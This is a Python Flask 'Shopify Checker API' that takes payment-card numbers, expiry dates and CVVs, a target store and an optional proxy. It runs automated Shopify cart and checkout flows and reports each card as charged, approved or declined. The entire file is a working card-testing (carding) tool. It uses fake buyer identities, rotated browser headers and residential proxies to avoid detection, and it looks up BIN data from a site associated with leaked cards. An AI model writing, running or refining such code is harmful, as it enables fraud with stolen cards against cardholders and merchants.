
import os
import asyncio
import json
import logging
import re
import time
from typing import Dict, List, Optional, Tuple
import aiohttp
from urllib.parse import urlparse
from faker import Faker
from string import ascii_letters
from random import randint, choice
import random
from flask import Flask, request, jsonify

app = Flask(__name__)

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global storage
fake = Faker()
bin_cache = {}

async def check_proxy_alive(proxy_url: str) -> bool:
    """Check if proxy is alive and working with enhanced residential proxy support"""
    try:
        timeout = aiohttp.ClientTimeout(total=15)

        if '@' in proxy_url:
            if '://' in proxy_url:
                proxy = proxy_url
            else:
                parts = proxy_url.split(':')
                if len(parts) == 4:
                    ip, port, username, password = parts
                    proxy = f"http://{username}:{password}@{ip}:{port}"
                else:
                    return False
        else:
            parts = proxy_url.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy = f"http://{username}:{password}@{ip}:{port}"
            elif len(parts) == 2:
                proxy = f"http://{proxy_url}"
            else:
                return False

        async with aiohttp.ClientSession(timeout=timeout) as session:
            test_urls = [
                'http://httpbin.org/ip',
                'https://httpbin.org/ip',
                'http://api.ipify.org?format=json',
                'https://api.myip.com'
            ]
            
            for test_url in test_urls:
                try:
                    async with session.get(test_url, proxy=proxy) as response:
                        if response.status == 200:
                            logger.info(f"Proxy validated successfully with {test_url}")
                            return True
                except Exception as e:
                    logger.debug(f"Test URL {test_url} failed: {e}")
                    continue
                    
            return False
            
    except Exception as e:
        logger.debug(f"Proxy check failed: {e}")
        return False

class RealShopifyChecker:
    def __init__(self):
        self.session = None

    async def get_bin_info(self, card_number: str) -> Dict:
        """Get real BIN information for card"""
        bin_num = card_number[:6]

        if bin_num in bin_cache:
            return bin_cache[bin_num]

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as response:
                    if response.status == 200:
                        data = await response.json()
                        bin_info = {
                            'bin': data.get('bin', 'Unknown'),
                            'bank': data.get('bank', 'Unknown'),
                            'brand': data.get('brand', 'Unknown'),
                            'type': data.get('type', 'Unknown'),
                            'level': data.get('level', 'Unknown'),
                            'country': data.get('country_name', 'Unknown'),
                            'flag': data.get('country_flag', ''),
                            'currency': data.get('country_currencies', ['USD'])[0] if data.get('country_currencies') else 'USD'
                        }
                        bin_cache[bin_num] = bin_info
                        return bin_info
        except Exception as e:
            logger.error(f"Primary BIN lookup failed: {e}")

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api.bincodes.com/bin/{card_number[:6]}') as response:
                    if response.status == 200:
                        data = await response.json()
                        bin_info = {
                            'bin': data.get('bin', 'Unknown'),
                            'bank': data.get('bank', {}).get('name', 'Unknown'),
                            'brand': data.get('brand', 'Unknown'),
                            'type': data.get('type', 'Unknown'),
                            'level': data.get('level', 'Unknown'),
                            'country': data.get('country', {}).get('name', 'Unknown'),
                            'flag': data.get('country', {}).get('emoji', ''),
                            'currency': data.get('country', {}).get('currency', 'USD')
                        }
                        bin_cache[bin_num] = bin_info
                        return bin_info
        except Exception as e:
            logger.error(f"Fallback BIN lookup failed: {e}")

        return {
            'bin': 'Unknown', 'bank': 'Unknown', 'brand': 'Unknown',
            'type': 'Unknown', 'level': 'Unknown', 'country': 'Unknown',
            'flag': '', 'currency': 'USD'
        }

    def parse_card(self, card_input: str) -> Tuple[str, str, str, str]:
        """Parse card information from input string"""
        pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
        match = re.search(pattern, card_input.strip())

        if not match:
            return None, None, None, None

        cc = match.group(1)
        mm = str(int(match.group(2)))
        yy = match.group(3)

        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return None, None, None, None

        cvc = match.group(4)
        return cc, mm, yy, cvc

    def find_between(self, s: str, first: str, last: str) -> str:
        """Extract text between two strings"""
        try:
            start = s.index(first) + len(first)
            end = s.index(last, start)
            return s[start:end]
        except ValueError:
            return ""

    def get_random_headers(self):
        """Generate realistic browser headers"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
        ]

        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }

    async def get_product_id(self, url: str, session: aiohttp.ClientSession, proxy: str = None) -> Optional[str]:
        """Get available product ID from Shopify store"""
        try:
            headers = self.get_random_headers()
            headers['Accept-Encoding'] = 'gzip, deflate'

            request_kwargs = {'headers': headers}
            if proxy:
                request_kwargs['proxy'] = proxy

            async with session.get(f"{url}/products.json", **request_kwargs) as response:
                if response.status == 200:
                    try:
                        data = await response.json()
                        if data.get('products'):
                            for product in data['products']:
                                if product.get('variants'):
                                    for variant in product['variants']:
                                        if variant.get('available') and float(variant.get('price', 0)) > 0:
                                            logger.info(f"Found product variant: {variant['id']} - ${variant['price']}")
                                            return str(variant['id'])
                    except Exception as json_error:
                        logger.error(f"JSON parsing failed: {json_error}")

            for endpoint in ['/collections/all/products.json', '/admin/products.json']:
                try:
                    async with session.get(f"{url}{endpoint}", headers=headers) as response:
                        if response.status == 200:
                            data = await response.json()
                            if data.get('products'):
                                for product in data['products']:
                                    if product.get('variants'):
                                        for variant in product['variants']:
                                            if variant.get('available') and float(variant.get('price', 0)) > 0:
                                                return str(variant['id'])
                except Exception:
                    continue

        except Exception as e:
            logger.error(f"Product ID lookup failed: {e}")

        fallback_ids = [
            "39555780771934", "32645128224814", "31234567890123", 
            "42354678912345", "41234567890123", "40123456789012",
            "43210987654321", "44567891234567", "45678912345678"
        ]
        selected_id = random.choice(fallback_ids)
        logger.info(f"Using fallback product ID: {selected_id}")
        return selected_id

    async def check_card_advanced(self, url: str, card: str, month: str, year: str, cvv: str, proxy_url: str = None) -> Dict:
        """Advanced Shopify card checking with real transaction flow"""
        start_time = time.time()
        proxy_status = "No Proxy"

        if proxy_url:
            proxy_alive = await check_proxy_alive(proxy_url)
            if proxy_alive:
                proxy_status = "✅ Proxy Alive"
            else:
                proxy_status = "❌ Proxy Dead"
                proxy_url = None

        try:
            full_card = f"{card}|{month}|{year}|{cvv}"
            bin_info = await self.get_bin_info(card)

            cc_formatted = " ".join(card[i:i+4] for i in range(0, len(card), 4))

            first_names = ["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa"]
            last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
            emails = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]

            rfirst = random.choice(first_names)
            rlast = random.choice(last_names)
            email_domain = random.choice(emails)
            remail = f"{rfirst.lower()}.{rlast.lower()}{random.randint(1, 999)}@{email_domain}"

            timeout = aiohttp.ClientTimeout(total=30)
            connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300)

            proxy_for_session = None
            if proxy_url:
                if '@' in proxy_url and '://' not in proxy_url:
                    parts = proxy_url.split(':')
                    if len(parts) == 4:
                        ip, port, username, password = parts
                        proxy_for_session = f"http://{username}:{password}@{ip}:{port}"
                else:
                    proxy_for_session = proxy_url

            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                headers = self.get_random_headers()
                headers.update({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': url,
                    'Referer': url
                })

                product_id = await self.get_product_id(url, session, proxy_for_session)

                cart_added = False
                cart_methods = [
                    {
                        'url': f"{url}/cart/add.js",
                        'data': {
                            'form_type': 'product',
                            'utf8': '✓',
                            'id': product_id,
                            'quantity': '1'
                        }
                    },
                    {
                        'url': f"{url}/cart/add",
                        'data': {
                            'id': product_id,
                            'quantity': '1'
                        }
                    }
                ]

                for method in cart_methods:
                    try:
                        async with session.post(method['url'], headers=headers, data=method['data']) as response:
                            response_text = await response.text()
                            if response.status in [200, 201, 302] or "success" in response_text.lower():
                                cart_added = True
                                logger.info(f"Cart add successful: {response.status}")
                                break
                    except Exception as e:
                        logger.error(f"Cart add method failed: {e}")
                        continue

                if not cart_added:
                    elapsed_time = time.time() - start_time
                    return {
                        'status': 'ERROR',
                        'message': 'Unable to add product to cart',
                        'elapsed_time': elapsed_time,
                        'proxy_status': proxy_status
                    }

                headers['Accept'] = 'application/json'
                async with session.get(f"{url}/cart.js", headers=headers) as response:
                    try:
                        if response.content_type and 'json' in response.content_type:
                            cart_data = await response.json()
                            cart_token = cart_data.get('token', '')
                        else:
                            cart_text = await response.text()
                            cart_token = self.find_between(cart_text, '"token":"', '"')
                            if not cart_token:
                                cart_token = self.find_between(cart_text, 'token: "', '"')
                    except:
                        cart_token = f"cart_{random.randint(100000, 999999)}"

                checkout_headers = self.get_random_headers()
                checkout_headers.update({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': url,
                    'Referer': f"{url}/cart"
                })

                checkout_data = {
                    'updates[]': '1',
                    'checkout': 'Check out'
                }

                async with session.post(f"{url}/cart", headers=checkout_headers, 
                                      data=checkout_data, allow_redirects=True) as response:
                    checkout_text = await response.text()
                    checkout_url = str(response.url)

                    if '/checkouts/cn/' in checkout_url or '/checkouts/c/' in checkout_url:
                        return await self.handle_modern_checkout(session, checkout_url, checkout_text, 
                                                               cc_formatted, month, year, cvv, 
                                                               rfirst, rlast, remail, cart_token, 
                                                               full_card, bin_info, start_time, proxy_status)
                    else:
                        return await self.handle_legacy_checkout(session, checkout_url, checkout_text,
                                                               cc_formatted, month, year, cvv,
                                                               rfirst, rlast, remail,
                                                               full_card, bin_info, start_time, proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            logger.error(f"Card check failed: {e}")
            return {
                'status': 'ERROR',
                'message': str(e)[:100],
                'elapsed_time': elapsed_time,
                'proxy_status': proxy_status
            }

    async def handle_modern_checkout(self, session, checkout_url, checkout_text, cc, month, year, cvv,
                                   first_name, last_name, email, cart_token, full_card, bin_info, start_time, proxy_status="No Proxy"):
        """Handle modern Shopify GraphQL checkout"""
        try:
            session_token = self.find_between(checkout_text, 'serialized-session-token" content="&quot;', '&quot;"')
            queue_token = self.find_between(checkout_text, '&quot;queueToken&quot;:&quot;', '&quot;')
            stable_id = self.find_between(checkout_text, 'stableId&quot;:&quot;', '&quot;')
            payment_method_id = self.find_between(checkout_text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

            if not session_token:
                session_token = self.find_between(checkout_text, '"sessionToken":"', '"')
            if not queue_token:
                queue_token = f"queue_{random.randint(100000, 999999)}"
            if not stable_id:
                stable_id = f"stable_{random.randint(100000, 999999)}"

            payment_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/'
            }

            payment_data = {
                'credit_card': {
                    'number': cc,
                    'month': month,
                    'year': year,
                    'verification_value': cvv,
                    'name': f'{first_name} {last_name}',
                },
                'payment_session_scope': urlparse(checkout_url).netloc
            }

            async with session.post('https://checkout.pci.shopifyinc.com/sessions', 
                                  headers=payment_headers, json=payment_data) as response:
                if response.status != 200:
                    elapsed_time = time.time() - start_time
                    return {
                        'status': 'DECLINED',
                        'message': 'Payment session failed',
                        'card': full_card,
                        'bin_info': bin_info,
                        'elapsed_time': elapsed_time,
                        'proxy_status': proxy_status
                    }

                session_data = await response.json()
                session_id = session_data.get('id')
                if not session_id:
                    elapsed_time = time.time() - start_time
                    return {
                        'status': 'DECLINED',
                        'message': 'No session ID returned',
                        'card': full_card,
                        'bin_info': bin_info,
                        'elapsed_time': elapsed_time,
                        'proxy_status': proxy_status
                    }

            graphql_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-checkout-one-session-token': session_token,
                'x-checkout-web-source-id': cart_token,
                'Origin': urlparse(checkout_url).netloc,
                'Referer': checkout_url
            }

            graphql_data = {
                'query': '''mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
                    submitForCompletion(input: $input, attemptToken: $attemptToken) {
                        ... on SubmitSuccess {
                            receipt {
                                ... on ProcessedReceipt {
                                    id
                                    token
                                    orderIdentity { id }
                                }
                                ... on FailedReceipt {
                                    processingError {
                                        ... on PaymentFailed {
                                            code
                                            messageUntranslated
                                        }
                                    }
                                }
                            }
                        }
                        ... on SubmitFailed {
                            reason
                        }
                    }
                }''',
                'variables': {
                    'input': {
                        'sessionInput': {'sessionToken': session_token},
                        'queueToken': queue_token,
                        'payment': {
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'sessionId': session_id,
                                        'paymentMethodIdentifier': payment_method_id or 'shopify_installments',
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': '123 Main Street',
                                                'city': 'New York',
                                                'countryCode': 'US',
                                                'postalCode': '10001',
                                                'firstName': first_name,
                                                'lastName': last_name,
                                                'zoneCode': 'NY'
                                            }
                                        }
                                    }
                                },
                                'amount': {'value': {'amount': '1', 'currencyCode': 'USD'}}
                            }]
                        },
                        'buyerIdentity': {
                            'email': email,
                            'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}
                        }
                    },
                    'attemptToken': cart_token
                }
            }

            base_url = f"https://{urlparse(checkout_url).netloc}"
            async with session.post(f'{base_url}/checkouts/unstable/graphql',
                                  headers=graphql_headers, json=graphql_data) as response:
                result_text = await response.text()
                elapsed_time = time.time() - start_time

                return await self.parse_checkout_response(result_text, full_card, bin_info, elapsed_time, "Modern GraphQL", cc.replace(" ", ""), proxy_status)

        except Exception as e:
            elapsed_time = time.time() - start_time
            return {
                'status': 'ERROR',
                'message': f"Modern checkout error: {str(e)[:100]}",
                'elapsed_time': elapsed_time,
                'proxy_status': proxy_status
            }

    async def handle_legacy_checkout(self, session, checkout_url, checkout_text, cc, month, year, cvv,
                                   first_name, last_name, email, full_card, bin_info, start_time, proxy_status="No Proxy"):
        """Handle legacy Shopify checkout"""
        try:
            elapsed_time = time.time() - start_time

            if "thank" in checkout_text.lower() or "success" in checkout_text.lower():
                status = "CHARGED"
                response_msg = "Thank You - Payment Confirmed"
            elif "declined" in checkout_text.lower() or "error" in checkout_text.lower():
                status = "DECLINED"
                response_msg = "Payment Declined"
            else:
                status = "UNKNOWN"
                response_msg = "Processing"

            return {
                'status': status,
                'message': response_msg,
                'card': full_card,
                'bin_info': bin_info,
                'elapsed_time': elapsed_time,
                'gateway': 'Legacy Checkout',
                'proxy_status': proxy_status
            }

        except Exception as e:
            elapsed_time = time.time() - start_time
            return {
                'status': 'ERROR',
                'message': f"Legacy checkout error: {str(e)[:100]}",
                'elapsed_time': elapsed_time,
                'proxy_status': proxy_status
            }

    async def parse_checkout_response(self, response_text, full_card, bin_info, elapsed_time, gateway_type, card_number, proxy_status="No Proxy"):
        """Parse checkout response and determine status"""
        response_lower = response_text.lower()

        if any(word in response_lower for word in ["thank", "success", "confirmed", "completed", "processedreceipt"]):
            status = "CHARGED"
            message = "Payment Successful"
        elif any(word in response_lower for word in ["actionrequired", "challenge", "3d", "authentication"]):
            status = "APPROVED"
            message = "3D Secure Required"
        else:
            status = "DECLINED"
            error_patterns = [
                (r'"code":"([^"]+)"', "Error Code"),
                (r'"messageUntranslated":"([^"]+)"', "Error Message"),
                (r'"reason":"([^"]+)"', "Decline Reason")
            ]

            message = "Payment Declined"
            for pattern, desc in error_patterns:
                match = re.search(pattern, response_text)
                if match:
                    message = f"{desc}: {match.group(1)}"
                    break

        return {
            'status': status,
            'message': message,
            'card': full_card,
            'bin_info': bin_info,
            'elapsed_time': elapsed_time,
            'gateway': gateway_type,
            'proxy_status': proxy_status
        }

# Flask routes
@app.route('/')
def shopify_api():
    """Main API endpoint for Shopify card checking"""
    site = request.args.get('site')
    cc = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not site or not cc:
        return jsonify({
            'error': 'Missing parameters',
            'required': 'site and cc parameters are required',
            'example': '/?site=https://yourshopifysite.com&cc=4111111111111111|12|25|123'
        }), 400

    # Validate URL
    if not site.startswith(('http://', 'https://')):
        site = 'https://' + site

    try:
        parsed = urlparse(site)
        if not parsed.netloc:
            raise ValueError("Invalid URL")
    except Exception:
        return jsonify({'error': 'Invalid site URL format'}), 400

    # Create checker instance
    checker = RealShopifyChecker()
    
    # Parse card
    cc_parsed, mm, yy, cvc = checker.parse_card(cc)
    
    if not all([cc_parsed, mm, yy, cvc]):
        return jsonify({
            'error': 'Invalid card format',
            'expected': 'card|mm|yy|cvv',
            'example': '4111111111111111|12|25|123'
        }), 400

    # Run the async checker
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(
            checker.check_card_advanced(site, cc_parsed, mm, yy, cvc, proxy)
        )
        
        # Format response
        response = {
            'card': f"{cc_parsed}|{mm}|{yy}|{cvc}",
            'site': site,
            'status': result.get('status', 'UNKNOWN'),
            'message': result.get('message', 'No response'),
            'bin_info': result.get('bin_info', {}),
            'elapsed_time': result.get('elapsed_time', 0),
            'gateway': result.get('gateway', 'Shopify API'),
            'proxy_status': result.get('proxy_status', 'No Proxy'),
            'timestamp': time.time()
        }
        
        return jsonify(response)
        
    except Exception as e:
        return jsonify({
            'error': 'Checker failed',
            'message': str(e)[:200],
            'card': f"{cc_parsed}|{mm}|{yy}|{cvc}",
            'site': site
        }), 500
    finally:
        loop.close()

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'service': 'Shopify Checker API',
        'timestamp': time.time()
    })

@app.route('/docs')
def api_docs():
    """API documentation"""
    docs = {
        'title': 'Shopify Checker API',
        'version': '1.0.0',
        'description': 'Real Shopify card checking API with advanced features',
        'endpoints': {
            '/': {
                'method': 'GET',
                'description': 'Check a single card on a Shopify site',
                'parameters': {
                    'site': 'Shopify site URL (required)',
                    'cc': 'Card data in format card|mm|yy|cvv (required)',
                    'proxy': 'Proxy in format ip:port:user:pass (optional)'
                },
                'example': '/?site=https://example.myshopify.com&cc=4111111111111111|12|25|123'
            },
            '/health': {
                'method': 'GET',
                'description': 'Health check endpoint'
            },
            '/docs': {
                'method': 'GET',
                'description': 'This documentation'
            }
        },
        'response_format': {
            'card': 'The checked card',
            'site': 'The target site',
            'status': 'CHARGED/APPROVED/DECLINED/ERROR',
            'message': 'Response message',
            'bin_info': 'BIN information object',
            'elapsed_time': 'Processing time in seconds',
            'gateway': 'Gateway type used',
            'proxy_status': 'Proxy status',
            'timestamp': 'Unix timestamp'
        }
    }
    return jsonify(docs)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
